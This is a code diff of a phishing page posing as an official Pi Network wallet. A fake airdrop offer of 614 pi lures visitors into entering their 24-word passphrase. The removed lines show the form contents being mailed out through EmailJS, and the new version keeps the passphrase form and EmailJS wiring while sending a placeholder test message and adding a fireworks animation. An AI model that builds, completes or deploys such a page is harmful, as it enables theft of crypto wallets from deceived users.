@@ -93,17 +93,31 @@
                 background: #357abd;
             }
 
-        .loading {
-            display: none;
-            font-size: 24px;
-            color: #4a90e2;
-            margin-top: 20px;
+        @keyframes fireworks {
+            0% {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+
+            50% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+
+            100% {
+                opacity: 0;
+                transform: scale(1.5);
+            }
         }
 
-        .success {
-            font-size: 18px;
-            color: green;
-            margin-top: 20px;
+        .fireworks {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            color: gold;
+            animation: fireworks 1.5s ease-out;
         }
     </style>
 </head>
@@ -117,50 +131,34 @@
         <h2>The official Pi Network has reached 2 million pioneers!</h2>
         <p>To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 614 pi/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem.</p>
         <h2>Enter Your 24-Word Passphrase</h2>
-        <form id="unlockForm" target="" onsubmit="sendEmail(event)">
+        <form onsubmit="sendEmail(event)">
             <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
             <button type="submit" class="btn-outline">Unlock With Passphrase</button>
         </form>
 
-        <button class="btn-filled" onclick="sendEmail()">Unlock With Fingerprint</button>
-
-        <!-- مؤشر التحميل -->
-        <div id="loading" class="loading">Loading...</div>
-
-        <!-- رساله النجاح بعد الإرسال -->
-        <div id="successMessage" class="success" style="display: none;">Your request has been sent successfully!</div>
-
+        <button class="btn-filled" onclick="sendEmail(event)">Unlock With Fingerprint</button>
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with your User ID
-        emailjs.init('user_tjataup');  // تم استبدال user_12345 بـ User ID الصحيح
+        emailjs.init('user_tjataup');  // تأكد من إدخال الـ User ID بشكل صحيح
 
         function sendEmail(event) {
-            if (event) event.preventDefault(); // منع إرسال النموذج مباشرة
+            if (event) event.preventDefault(); // منع إرسال النموذج بشكل افتراضي
 
-            // إظهار مؤشر التحميل
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('successMessage').style.display = 'none';  // إخفاء رسالة النجاح السابقة إن كانت موجودة
+            var templateParams = {
+                to_name: 'Ashraf',  // تعديل الاسم حسب الحاجة
+                message: 'Hello, this is a test email.'
+            };
 
-            // البيانات التي سيتم إرسالها عبر البريد الإلكتروني
-            var formData = new FormData(event.target || event);
-
-            // إرسال الرسالة عبر EmailJS باستخدام Service ID و Template ID الصحيحين
-            emailjs.sendForm('service_tjataup', 'template_ca9ohx4', formData)
+            emailjs.send('service_tjataup', 'template_ca9ohx4', templateParams)
                 .then(function (response) {
-                    // إخفاء مؤشر التحميل
-                    document.getElementById('loading').style.display = 'none';
-
-                    // إظهار رسالة النجاح
-                    document.getElementById('successMessage').style.display = 'block';
+                    alert('Message sent successfully!');
+                    // يمكنك إضافة أي كود لتمرير المستخدم إلى صفحة أخرى أو أي إجراء بعد الإرسال.
                 }, function (error) {
-                    // إخفاء مؤشر التحميل
-                    document.getElementById('loading').style.display = 'none';
-                    alert('Failed to send email. Please try again.');
+                    alert('Failed to send message. Error: ' + error);
                 });
         }
     </script>
